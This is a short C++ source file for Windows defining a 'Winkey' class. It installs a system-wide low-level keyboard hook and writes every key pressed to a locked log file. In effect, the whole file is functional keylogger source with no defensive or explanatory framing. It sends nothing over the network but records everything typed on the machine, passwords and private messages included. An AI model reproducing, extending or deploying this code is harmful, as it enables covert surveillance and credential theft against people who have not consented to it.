#include "winkey.h"

Winkey::Winkey() {
	gLogHandle_ = CreateFileA(
		LOG_FILE,
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (gLogHandle_ == INVALID_HANDLE_VALUE) {
		throw std::runtime_error(std::format("CreateFile failed ({})\n", GetLastError()));
	}

	OVERLAPPED overlap = {0};

	if (!LockFileEx(
		gLogHandle_,
		LOCKFILE_EXCLUSIVE_LOCK | LOCKFILE_FAIL_IMMEDIATELY,
		0,
		1,
		0,
		&overlap
	)) {
		throw std::runtime_error(std::format("LockFileEx failed ({})\n", GetLastError()));
	}
}

Winkey::~Winkey() {
	if (gLogHandle_ == nullptr) {
		return;
	}

	OVERLAPPED overlap = { 0 };

	if (!UnlockFileEx(gLogHandle_, 0, 1, 0, &overlap)) {
		std::cout << std::format("UnlockFileEx failed ({})\n", GetLastError());
	}
	CloseHandle(gLogHandle_);

	gLogHandle_ = nullptr;
}

int Winkey::Hook() {
	HHOOK logger = SetWindowsHookExA(WH_KEYBOARD_LL, &Winkey::onKey, NULL, 0);
	if (logger == nullptr) {
		std::cout << std::format("SetWindowsHookExA failed ({})\n", GetLastError());
		return 1;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, WM_INPUT, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

/*
	HOOKPROC onKey;
*/
LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		PKBDLLHOOKSTRUCT vbd = (PKBDLLHOOKSTRUCT)lParam;

		DWORD bytesWrote;
		const std::string data = std::format("{:c}", vbd->vkCode);
		WriteFile(gLogHandle_, data.c_str(), data.length(), &bytesWrote, NULL);
	}

	/* Forward to next hooks ... */
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int __cdecl _tmain(int argc, TCHAR* argv[])
{
	(void)argv;
	if (argc != 1) {
		return 1;
	}

	gLogHandle_ = nullptr;

	try {
		auto winkey = Winkey();
		return winkey.Hook();
	 }
	catch (const std::runtime_error& e) {
		std::cout << e.what();
		return 1;
	}
}